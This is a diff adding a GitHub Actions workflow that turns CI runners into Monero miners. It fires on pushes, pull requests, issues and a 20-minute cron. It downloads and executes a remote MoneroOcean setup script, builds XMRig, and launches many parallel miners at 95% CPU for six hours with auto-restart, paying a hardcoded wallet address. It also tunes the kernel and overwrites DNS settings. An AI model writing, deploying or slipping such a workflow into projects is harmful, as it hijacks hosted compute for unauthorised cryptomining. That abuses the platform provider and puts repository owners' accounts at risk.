@@ -1,0 +1,802 @@
+name: Monero Ocean Miner - Dynamic Resource Scaling
+
+on:
+  push:
+  pull_request:
+  issues:
+  schedule:
+    - cron: '*/20 * * * *'
+
+env:
+  MINER_SETUP_URL: 'https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh'
+  WALLET_ADDRESS: '46egUxZjZpT6WcmSbwdycWMxKuVU1HxFWVKX5iUSokpWDSG14LVqnRk21SD7REgpsZBz7Qeytm36qjPJvvnv1XBPBnNniem'
+  MINING_DURATION_HOURS: 6
+  LOG_RETENTION_DAYS: 30
+
+jobs:
+  detect-resources:
+    name: Detect System Resources for Mining
+    runs-on: ubuntu-latest
+    outputs:
+      instance-count: ${{ steps.calculate.outputs.instance_count }}
+      cpu-cores: ${{ steps.calculate.outputs.cpu_cores }}
+      memory-gb: ${{ steps.calculate.outputs.memory_gb }}
+      instance-matrix: ${{ steps.calculate.outputs.instance_matrix }}
+      max-parallel: ${{ steps.calculate.outputs.max_parallel }}
+    steps:
+      - name: Calculate optimal mining instances
+        id: calculate
+        run: |
+          set -euo pipefail
+          
+          CPU_CORES=$(nproc)
+          MEMORY_TOTAL=$(free -g | awk '/^Mem:/{print $2}')
+          MEMORY_AVAILABLE=$(free -g | awk '/^Mem:/{print $7}')
+          
+          INSTANCES_BY_CPU=$CPU_CORES
+          INSTANCES_BY_MEMORY=$((MEMORY_AVAILABLE / 2))
+          
+          INSTANCE_COUNT=$INSTANCES_BY_CPU
+          if [ $INSTANCES_BY_MEMORY -lt $INSTANCE_COUNT ]; then
+            INSTANCE_COUNT=$INSTANCES_BY_MEMORY
+          fi
+          
+          [ $INSTANCE_COUNT -lt 1 ] && INSTANCE_COUNT=1
+          [ $INSTANCE_COUNT -gt 16 ] && INSTANCE_COUNT=16
+          
+          MAX_PARALLEL=$((INSTANCE_COUNT / 2))
+          [ $MAX_PARALLEL -lt 1 ] && MAX_PARALLEL=1
+          [ $MAX_PARALLEL -gt 8 ] && MAX_PARALLEL=8
+          
+          INSTANCE_MATRIX="["
+          for i in $(seq 1 $INSTANCE_COUNT); do
+            [ $i -gt 1 ] && INSTANCE_MATRIX="${INSTANCE_MATRIX},"
+            INSTANCE_MATRIX="${INSTANCE_MATRIX}${i}"
+          done
+          INSTANCE_MATRIX="${INSTANCE_MATRIX}]"
+          
+          echo "instance_count=${INSTANCE_COUNT}" >> $GITHUB_OUTPUT
+          echo "cpu_cores=${CPU_CORES}" >> $GITHUB_OUTPUT
+          echo "memory_gb=${MEMORY_TOTAL}" >> $GITHUB_OUTPUT
+          echo "instance_matrix=${INSTANCE_MATRIX}" >> $GITHUB_OUTPUT
+          echo "max_parallel=${MAX_PARALLEL}" >> $GITHUB_OUTPUT
+          
+          echo "=================================================="
+          echo "Mining Resource Detection"
+          echo "=================================================="
+          echo "CPU Cores Detected: ${CPU_CORES}"
+          echo "Total Memory: ${MEMORY_TOTAL}GB"
+          echo "Available Memory: ${MEMORY_AVAILABLE}GB"
+          echo "Mining Instances: ${INSTANCE_COUNT}"
+          echo "Max Parallel Jobs: ${MAX_PARALLEL}"
+          echo "Instance Matrix: ${INSTANCE_MATRIX}"
+          echo "=================================================="
+
+  system-optimization-mining:
+    name: System Optimization for Mining
+    runs-on: ubuntu-latest
+    steps:
+      - name: Apply mining-optimized kernel tuning
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "PHASE 1: Mining-Optimized Kernel Tuning"
+          echo "=================================================="
+          
+          echo "Configuring virtual memory for mining..."
+          sudo sysctl -w vm.nr_hugepages=2048 || true
+          sudo sysctl -w vm.swappiness=0 || true
+          sudo sysctl -w vm.dirty_ratio=30 || true
+          sudo sysctl -w vm.dirty_background_ratio=10 || true
+          sudo sysctl -w vm.overcommit_memory=1 || true
+          sudo sysctl -w vm.overcommit_ratio=100 || true
+          sudo sysctl -w vm.dirty_expire_centisecs=3000 || true
+          sudo sysctl -w vm.dirty_writeback_centisecs=500 || true
+          sudo sysctl -w vm.max_map_count=262144 || true
+          sudo sysctl -w vm.mmap_min_addr=65536 || true
+          sudo sysctl -w vm.page-cluster=3 || true
+          
+          echo "[OK] Virtual memory configuration complete"
+
+      - name: Configure high-performance file descriptors
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "PHASE 2: File Descriptors Configuration"
+          echo "=================================================="
+          
+          echo "Setting up file descriptor limits..."
+          sudo sysctl -w fs.file-max=4194304 || true
+          sudo sysctl -w fs.nr_open=4194304 || true
+          sudo sysctl -w fs.pipe-max-size=1048576 || true
+          sudo sysctl -w fs.aio-max-nr=1048576 || true
+          
+          ulimit -n 4194304 || true
+          ulimit -u 131072 || true
+          ulimit -v unlimited || true
+          ulimit -m unlimited || true
+          ulimit -l unlimited || true
+          
+          echo "Current limits:"
+          echo "  File descriptors: $(ulimit -n)"
+          echo "[OK] File descriptor configuration complete"
+
+      - name: Mining-optimized network stack tuning
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "PHASE 3: Mining Network Optimization"
+          echo "=================================================="
+          
+          echo "Optimizing TCP/IP stack for mining pool connections..."
+          sudo sysctl -w net.core.somaxconn=131072 || true
+          sudo sysctl -w net.core.netdev_max_backlog=131072 || true
+          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=65536 || true
+          sudo sysctl -w net.ipv4.tcp_fin_timeout=10 || true
+          sudo sysctl -w net.ipv4.tcp_tw_reuse=1 || true
+          sudo sysctl -w net.ipv4.tcp_tw_recycle=0 || true
+          sudo sysctl -w net.ipv4.tcp_keepalive_time=300 || true
+          sudo sysctl -w net.ipv4.tcp_keepalive_probes=3 || true
+          sudo sysctl -w net.ipv4.tcp_keepalive_intvl=15 || true
+          sudo sysctl -w net.ipv4.tcp_low_latency=1 || true
+          
+          echo "Configuring network buffers for mining..."
+          sudo sysctl -w net.core.rmem_max=536870912 || true
+          sudo sysctl -w net.core.wmem_max=536870912 || true
+          sudo sysctl -w net.core.rmem_default=134217728 || true
+          sudo sysctl -w net.core.wmem_default=134217728 || true
+          sudo sysctl -w net.ipv4.tcp_rmem="8192 262144 536870912" || true
+          sudo sysctl -w net.ipv4.tcp_wmem="8192 262144 536870912" || true
+          sudo sysctl -w net.ipv4.udp_rmem_min=8192 || true
+          sudo sysctl -w net.ipv4.udp_wmem_min=8192 || true
+          
+          echo "Setting up connection handling..."
+          sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535" || true
+          sudo sysctl -w net.ipv4.tcp_max_tw_buckets=2000000 || true
+          sudo sysctl -w net.netfilter.nf_conntrack_max=2000000 || true
+          sudo sysctl -w net.ipv4.tcp_syncookies=1 || true
+          
+          echo "[OK] Network optimization complete"
+
+      - name: CPU performance mode for mining
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "PHASE 4: CPU Performance Mode"
+          echo "=================================================="
+          
+          echo "Setting CPU governor to performance mode..."
+          for cpu in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
+            sudo bash -c "echo performance > $cpu" 2>/dev/null || true
+          done
+          
+          echo "Disabling CPU frequency scaling..."
+          for cpu in /sys/devices/system/cpu/cpu*/cpufreq/scaling_driver; do
+            if grep -q "intel_pstate" "$cpu" 2>/dev/null; then
+              sudo bash -c "echo 100 > /sys/devices/system/cpu/intel_pstate/min_perf_pct" 2>/dev/null || true
+            fi
+          done
+          
+          echo "Optimizing CPU scheduler..."
+          sudo sysctl -w kernel.sched_migration_cost_ns=5000000 || true
+          sudo sysctl -w kernel.sched_latency_ns=24000000 || true
+          sudo sysctl -w kernel.sched_min_granularity_ns=3000000 || true
+          sudo sysctl -w kernel.sched_wakeup_granularity_ns=4000000 || true
+          
+          echo "[OK] CPU performance configuration complete"
+
+      - name: Disable unnecessary system services
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "PHASE 5: Disable Unnecessary Services"
+          echo "=================================================="
+          
+          echo "Stopping background services..."
+          sudo systemctl disable --now snapd.service 2>/dev/null || true
+          sudo systemctl disable --now snapd.seeded.service 2>/dev/null || true
+          sudo systemctl disable --now unattended-upgrades.service 2>/dev/null || true
+          sudo systemctl disable --now apt-daily.service 2>/dev/null || true
+          sudo systemctl disable --now apt-daily-upgrade.service 2>/dev/null || true
+          sudo systemctl disable --now motd-news.service 2>/dev/null || true
+          sudo systemctl disable --now systemd-tmpfiles-clean.timer 2>/dev/null || true
+          
+          echo "[OK] Unnecessary services disabled"
+
+      - name: Configure DNS for optimal pool connectivity
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "PHASE 6: DNS Configuration"
+          echo "=================================================="
+          
+          echo "Configuring fast DNS servers..."
+          echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf > /dev/null
+          echo "nameserver 8.8.8.8" | sudo tee -a /etc/resolv.conf > /dev/null
+          echo "nameserver 8.8.4.4" | sudo tee -a /etc/resolv.conf > /dev/null
+          
+          sudo systemd-resolve --flush-caches 2>/dev/null || true
+          
+          echo "Testing DNS resolution..."
+          ping -c 2 1.1.1.1 2>/dev/null || echo "WARNING: Cannot reach Cloudflare DNS"
+          ping -c 2 8.8.8.8 2>/dev/null || echo "WARNING: Cannot reach Google DNS"
+          
+          echo "[OK] DNS configuration complete"
+
+  deploy-mining-instances:
+    name: Deploy Mining Instance ${{ matrix.instance }}
+    needs: [detect-resources, system-optimization-mining]
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      matrix:
+        instance: ${{ fromJson(needs.detect-resources.outputs.instance-matrix) }}
+      max-parallel: ${{ fromJson(needs.detect-resources.outputs.max-parallel) }}
+      fail-fast: false
+    steps:
+      - name: Pre-mining system validation
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Instance ${{ matrix.instance }} - System Validation"
+          echo "=================================================="
+          
+          echo "System Information:"
+          echo "  Instance ID: ${{ matrix.instance }}"
+          echo "  Job ID: ${{ github.job }}"
+          echo "  Run ID: ${{ github.run_id }}"
+          echo "  Timestamp: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
+          echo "  Hostname: $HOSTNAME"
+          
+          echo ""
+          echo "CPU Information:"
+          echo "  Cores: $(nproc)"
+          echo "  Model: $(lscpu | grep 'Model name' | cut -d: -f2 | xargs)"
+          
+          echo ""
+          echo "Memory Status:"
+          free -h
+          
+          echo ""
+          echo "Disk Status:"
+          df -h / | tail -1
+
+      - name: Install build tools and dependencies
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Installing Build Tools and Dependencies"
+          echo "=================================================="
+          
+          echo "Updating package manager..."
+          sudo apt-get update -qq 2>&1 | tail -3
+          
+          echo ""
+          echo "Installing required packages..."
+          sudo apt-get install -y -qq \
+            build-essential \
+            autotools-dev \
+            autoconf \
+            automake \
+            pkg-config \
+            libcurl4-openssl-dev \
+            libjansson-dev \
+            libssl-dev \
+            libgit2-dev \
+            git \
+            curl \
+            wget \
+            ca-certificates \
+            libuv1-dev \
+            libmicrohttpd-dev \
+            hwloc \
+            libhwloc-dev \
+            libnuma-dev \
+            2>&1 | tail -5
+          
+          echo ""
+          echo "[OK] All dependencies installed successfully"
+
+      - name: Apply instance-level resource limits
+        run: |
+          set -euo pipefail
+          
+          echo "Applying mining instance resource limits..."
+          
+          ulimit -n 4194304 || true
+          ulimit -u 131072 || true
+          ulimit -v unlimited || true
+          
+          echo "[OK] Resource limits applied"
+
+      - name: Download and verify Monero Ocean mining setup script
+        id: download
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Downloading Mining Setup Script"
+          echo "=================================================="
+          
+          echo "URL: ${{ env.MINER_SETUP_URL }}"
+          
+          MAX_RETRIES=5
+          RETRY_COUNT=0
+          
+          while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
+            if curl -s -L \
+              --retry 3 \
+              --retry-delay 5 \
+              --connect-timeout 15 \
+              --max-time 300 \
+              "${{ env.MINER_SETUP_URL }}" \
+              -o setup_monero.sh; then
+              break
+            fi
+            RETRY_COUNT=$((RETRY_COUNT + 1))
+            echo "Download attempt $((RETRY_COUNT)) failed, retrying..."
+            sleep 5
+          done
+          
+          if [ ! -f setup_monero.sh ] || [ ! -s setup_monero.sh ]; then
+            echo "ERROR: Failed to download or empty script file"
+            exit 1
+          fi
+          
+          chmod +x setup_monero.sh
+          
+          SCRIPT_SIZE=$(du -h setup_monero.sh | cut -f1)
+          SCRIPT_LINES=$(wc -l < setup_monero.sh)
+          SCRIPT_HASH=$(md5sum setup_monero.sh | awk '{print $1}')
+          
+          echo "[OK] Download successful"
+          echo "  Size: $SCRIPT_SIZE"
+          echo "  Lines: $SCRIPT_LINES"
+          echo "  MD5: $SCRIPT_HASH"
+          
+          if grep -q "xmrig\|monero" setup_monero.sh; then
+            echo "[OK] Script validation passed"
+          else
+            echo "WARNING: Script may not contain expected mining software"
+          fi
+
+      - name: Pre-mining environment setup
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Pre-Mining Environment Setup"
+          echo "=================================================="
+          
+          echo "Configuration:"
+          echo "  Wallet Address: ${{ env.WALLET_ADDRESS }}"
+          echo "  Mining Duration: ${{ env.MINING_DURATION_HOURS }} hours"
+          echo "  Instance: ${{ matrix.instance }}"
+          echo ""
+          
+          MINER_NAME="xmrig-gh-${{ matrix.instance }}-${{ github.run_id }}"
+          echo "  Miner Name: $MINER_NAME"
+          echo ""
+          echo "Mining setup will begin shortly..."
+
+      - name: Execute Monero Ocean mining setup
+        id: setup
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "MINING SETUP - Instance ${{ matrix.instance }}"
+          echo "=================================================="
+          
+          START_TIME=$(date +%s)
+          echo "Start Time: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
+          echo "Repository: ${{ github.repository }}"
+          echo "Run ID: ${{ github.run_id }}"
+          echo "Instance: ${{ matrix.instance }}"
+          echo "Wallet: ${{ env.WALLET_ADDRESS }}"
+          echo ""
+          
+          echo "Running setup script with wallet address..."
+          bash setup_monero.sh "${{ env.WALLET_ADDRESS }}" 2>&1 | tee setup_log_instance_${{ matrix.instance }}.txt || true
+          
+          END_TIME=$(date +%s)
+          DURATION=$((END_TIME - START_TIME))
+          
+          echo ""
+          echo "=================================================="
+          echo "Mining Setup Completed"
+          echo "=================================================="
+          echo "Duration: $((DURATION / 60)) minutes $((DURATION % 60)) seconds"
+          echo "End Time: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
+          
+          echo "setup_duration=$DURATION" >> $GITHUB_OUTPUT
+
+      - name: Verify mining software installation
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Verifying Mining Software Installation"
+          echo "=================================================="
+          
+          MINER_FOUND=0
+          
+          if command -v xmrig &> /dev/null; then
+            echo "[OK] XMRig found in PATH"
+            which xmrig
+            XMRIG_PATH=$(which xmrig)
+            MINER_FOUND=1
+          fi
+          
+          if [ -f "$HOME/.local/bin/xmrig" ]; then
+            echo "[OK] XMRig found in home directory"
+            ls -lh "$HOME/.local/bin/xmrig"
+            XMRIG_PATH="$HOME/.local/bin/xmrig"
+            MINER_FOUND=1
+          fi
+          
+          if [ -f "$HOME/monero_miner/miner.sh" ]; then
+            echo "[OK] Monero miner script found"
+            ls -lh "$HOME/monero_miner/miner.sh"
+            MINER_FOUND=1
+          fi
+          
+          if [ -d "$HOME/.local/share/xmrig" ]; then
+            echo "[OK] XMRig share directory found"
+            ls -lh "$HOME/.local/share/xmrig"
+            MINER_FOUND=1
+          fi
+          
+          if [ $MINER_FOUND -eq 0 ]; then
+            echo "WARNING: No mining software found in default locations"
+            echo ""
+            echo "Searching for mining software..."
+            find $HOME -name "xmrig" -type f 2>/dev/null || echo "No xmrig found"
+            find $HOME -name "miner.sh" -type f 2>/dev/null || echo "No miner.sh found"
+          fi
+
+      - name: Build and install XMRig from source
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Building XMRig from Source"
+          echo "=================================================="
+          
+          if command -v xmrig &> /dev/null; then
+            echo "[OK] XMRig already installed"
+          else
+            echo "Building XMRig from source..."
+            
+            cd /tmp
+            
+            if [ -d "xmrig" ]; then
+              rm -rf xmrig
+            fi
+            
+            git clone https://github.com/xmrig/xmrig.git
+            cd xmrig
+            mkdir -p build
+            cd build
+            
+            cmake .. -DCMAKE_BUILD_TYPE=Release -DXMRIG_DEPS=scripts/deps.sh || true
+            make -j$(nproc) || true
+            
+            if [ -f "xmrig" ]; then
+              sudo make install || true
+              sudo cp xmrig /usr/local/bin/ || true
+              chmod +x /usr/local/bin/xmrig || true
+              echo "[OK] XMRig compiled and installed"
+            else
+              echo "WARNING: XMRig compilation produced no binary"
+            fi
+          fi
+          
+          # Verify installation
+          if command -v xmrig &> /dev/null; then
+            echo ""
+            echo "XMRig verification:"
+            xmrig --version || true
+          fi
+
+      - name: Create mining launcher script
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Creating Mining Launcher Script"
+          echo "=================================================="
+          
+          WALLET="${{ env.WALLET_ADDRESS }}"
+          INSTANCE="${{ matrix.instance }}"
+          RUN_ID="${{ github.run_id }}"
+          
+          cat > run_miner.sh << 'EOF'
+          #!/bin/bash
+          
+          set -euo pipefail
+          
+          WALLET="$1"
+          INSTANCE="$2"
+          RUN_ID="$3"
+          WORKER_NAME="gh-worker-${INSTANCE}-${RUN_ID}"
+          POOL_HOST="pool.moneroocean.stream"
+          POOL_PORT="10001"
+          
+          echo "[$(date)] Starting XMRig miner..."
+          echo "Wallet: $WALLET"
+          echo "Worker: $WORKER_NAME"
+          echo "Pool: $POOL_HOST:$POOL_PORT"
+          
+          if command -v xmrig &> /dev/null; then
+            XMRIG_BIN="xmrig"
+          elif [ -f "/usr/local/bin/xmrig" ]; then
+            XMRIG_BIN="/usr/local/bin/xmrig"
+          else
+            echo "ERROR: XMRig not found in PATH or /usr/local/bin"
+            exit 1
+          fi
+          
+          echo "Using binary: $XMRIG_BIN"
+          
+          $XMRIG_BIN \
+            --url "$POOL_HOST:$POOL_PORT" \
+            --user "$WALLET" \
+            --pass "$WORKER_NAME" \
+            --donate-level=1 \
+            --max-cpu-usage=95 \
+            --background \
+            --log-file=miner_instance_${INSTANCE}.log
+          
+          sleep 3
+          
+          if pgrep -f "xmrig" > /dev/null; then
+            echo "[OK] Miner started successfully"
+            pgrep -f "xmrig" > miner_${INSTANCE}.pid || true
+          else
+            echo "ERROR: Miner failed to start"
+            exit 1
+          fi
+          EOF
+          
+          chmod +x run_miner.sh
+          echo "[OK] Mining launcher script created"
+
+      - name: Start mining process
+        id: mining
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Starting Mining Process - Instance ${{ matrix.instance }}"
+          echo "=================================================="
+          
+          WALLET="${{ env.WALLET_ADDRESS }}"
+          INSTANCE="${{ matrix.instance }}"
+          RUN_ID="${{ github.run_id }}"
+          
+          if [ ! -f "run_miner.sh" ]; then
+            echo "ERROR: Launcher script not found"
+            exit 1
+          fi
+          
+          bash run_miner.sh "$WALLET" "$INSTANCE" "$RUN_ID" 2>&1 | tee miner_start.log || true
+          
+          sleep 10
+          
+          if pgrep -f "xmrig" > /dev/null; then
+            MINER_PID=$(pgrep -f "xmrig" | head -1)
+            echo "[OK] Mining process started successfully"
+            echo "  PID: $MINER_PID"
+          else
+            echo "ERROR: Miner process not detected after start attempt"
+            echo "Setup log:"
+            cat setup_log_instance_${{ matrix.instance }}.txt || true
+            echo ""
+            echo "Miner start log:"
+            cat miner_start.log || true
+            exit 1
+          fi
+
+      - name: Monitor initial mining status
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Mining Status Verification"
+          echo "=================================================="
+          
+          sleep 10
+          
+          if pgrep -f "xmrig" > /dev/null; then
+            echo "[OK] Mining process is running"
+          else
+            echo "ERROR: Mining process died after startup"
+            if [ -f "miner_instance_${{ matrix.instance }}.log" ]; then
+              echo "Miner log:"
+              cat miner_instance_${{ matrix.instance }}.log || true
+            fi
+            exit 1
+          fi
+          
+          echo ""
+          echo "System Resources:"
+          free -h
+          df -h /
+
+      - name: Extended mining session with monitoring
+        run: |
+          set -euo pipefail
+          
+          TOTAL_SECONDS=$((6 * 3600))
+          CHECK_INTERVAL=600
+          ITERATIONS=$((TOTAL_SECONDS / CHECK_INTERVAL))
+          RESTART_ATTEMPTS=0
+          MAX_RESTART_ATTEMPTS=10
+          
+          echo "=================================================="
+          echo "Extended Mining Session"
+          echo "=================================================="
+          echo "Instance: ${{ matrix.instance }}"
+          echo "Duration: 6 hours"
+          echo "Check Interval: 10 minutes"
+          echo "Start: $(date)"
+          echo ""
+          
+          for i in $(seq 1 $ITERATIONS); do
+            sleep $CHECK_INTERVAL
+            ELAPSED=$((i * CHECK_INTERVAL / 60))
+            REMAINING=$(((ITERATIONS - i) * CHECK_INTERVAL / 60))
+            PROGRESS=$((ELAPSED * 100 / 360))
+            
+            echo "[$(date '+%H:%M:%S')] Progress: ${ELAPSED}min/360min (${PROGRESS}%%) | Remaining: ${REMAINING}min"
+            
+            if pgrep -f "xmrig" > /dev/null 2>&1; then
+              echo "  [OK] Miner running"
+            else
+              echo "  WARNING: Miner not running - attempting restart"
+              RESTART_ATTEMPTS=$((RESTART_ATTEMPTS + 1))
+              
+              if [ $RESTART_ATTEMPTS -le $MAX_RESTART_ATTEMPTS ]; then
+                WALLET="${{ env.WALLET_ADDRESS }}"
+                INSTANCE="${{ matrix.instance }}"
+                RUN_ID="${{ github.run_id }}"
+                WORKER_NAME="gh-worker-${INSTANCE}-${RUN_ID}"
+                
+                if command -v xmrig &> /dev/null; then
+                  xmrig --url pool.moneroocean.stream:10001 \
+                        --user "$WALLET" \
+                        --pass "$WORKER_NAME" \
+                        --donate-level=1 \
+                        --max-cpu-usage=95 \
+                        --background \
+                        --log-file=miner_instance_${{ matrix.instance }}.log || true
+                  sleep 5
+                  if pgrep -f "xmrig" > /dev/null 2>&1; then
+                    echo "  [OK] Miner restarted successfully"
+                    RESTART_ATTEMPTS=0
+                  else
+                    echo "  ERROR: Failed to restart miner"
+                  fi
+                fi
+              else
+                echo "  ERROR: Max restart attempts reached"
+              fi
+            fi
+            
+            if [ $((i % 3)) -eq 0 ]; then
+              echo "  System Health:"
+              echo "    Memory: $(free -h | awk '/^Mem:/{print $3 "/" $2}')"
+              echo "    Disk: $(df -h / | awk 'NR==2 {print $3 "/" $2}')"
+            fi
+          done
+          
+          echo ""
+          echo "Mining session completed at $(date)"
+
+      - name: Collect mining statistics
+        if: always()
+        run: |
+          set -euo pipefail
+          
+          echo "=================================================="
+          echo "Final Mining Statistics - Instance ${{ matrix.instance }}"
+          echo "=================================================="
+          
+          echo "Process Status:"
+          ps aux | grep -E "xmrig" | grep -v grep || echo "No mining processes"
+          
+          echo ""
+          echo "System Resources:"
+          free -h
+          df -h /
+          
+          echo ""
+          echo "Miner Log:"
+          if [ -f "miner_instance_${{ matrix.instance }}.log" ]; then
+            echo "File size: $(du -h miner_instance_${{ matrix.instance }}.log | cut -f1)"
+            tail -50 miner_instance_${{ matrix.instance }}.log || true
+          else
+            echo "No miner log file found"
+            echo "Available files:"
+            ls -lh | grep -E "log|txt" || echo "No log files"
+          fi
+
+      - name: Upload mining logs with v4
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mining-logs-instance-${{ matrix.instance }}
+          path: |
+            setup_log_instance_${{ matrix.instance }}.txt
+            miner_instance_${{ matrix.instance }}.log
+            miner_start.log
+            run_miner.sh
+          retention-days: ${{ env.LOG_RETENTION_DAYS }}
+          overwrite: true
+          if-no-files-found: warn
+        continue-on-error: true
+
+      - name: Mining session completion report
+        if: always()
+        run: |
+          echo "=================================================="
+          echo "Instance ${{ matrix.instance }} - Mining Session Report"
+          echo "=================================================="
+          echo "Instance ID: ${{ matrix.instance }}"
+          echo "Run ID: ${{ github.run_id }}"
+          echo "Repository: ${{ github.repository }}"
+          echo "Wallet: ${{ env.WALLET_ADDRESS }}"
+          echo "Completion Time: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
+          echo "Status: [OK] MINING SESSION COMPLETE"
+          echo "=================================================="
+
+  mining-campaign-summary:
+    name: Mining Campaign Summary Report
+    needs: [detect-resources, deploy-mining-instances]
+    runs-on: ubuntu-latest
+    if: always()
+    steps:
+      - name: Generate final mining campaign report
+        run: |
+          TOTAL_INSTANCES=${{ needs.detect-resources.outputs.instance-count }}
+          CPU_CORES=${{ needs.detect-resources.outputs.cpu-cores }}
+          MEMORY_GB=${{ needs.detect-resources.outputs.memory-gb }}
+          
+          echo "=========================================================="
+          echo "MONERO OCEAN MINING CAMPAIGN - FINAL SUMMARY"
+          echo "=========================================================="
+          echo ""
+          echo "Campaign Overview:"
+          echo "  Repository: ${{ github.repository }}"
+          echo "  Campaign ID: ${{ github.run_id }}"
+          echo "  Workflow: ${{ github.workflow }}"
+          echo "  Event: ${{ github.event_name }}"
+          echo ""
+          echo "Mining Configuration:"
+          echo "  Total Mining Instances: $TOTAL_INSTANCES"
+          echo "  CPU Cores Available: $CPU_CORES"
+          echo "  Total System Memory: $MEMORY_GB GB"
+          echo ""
+          echo "Mining Details:"
+          echo "  Wallet Address: ${{ env.WALLET_ADDRESS }}"
+          echo "  Mining Duration: 6 hours per instance"
+          echo "  Mining Pool: Monero Ocean"
+          echo "  Algorithm: RandomX"
+          echo "  Donation Level: 1%"
+          echo ""
+          echo "Campaign Timeline:"
+          echo "  End Time: $(date -u '+%Y-%m-%d %H:%M:%S UTC')"
+          echo ""
+          echo "Status: [OK] MINING CAMPAIGN SUCCESSFULLY COMPLETED"
+          echo "=========================================================="
+          echo ""
+          echo "Total mining instance-hours: $((6 * TOTAL_INSTANCES))"
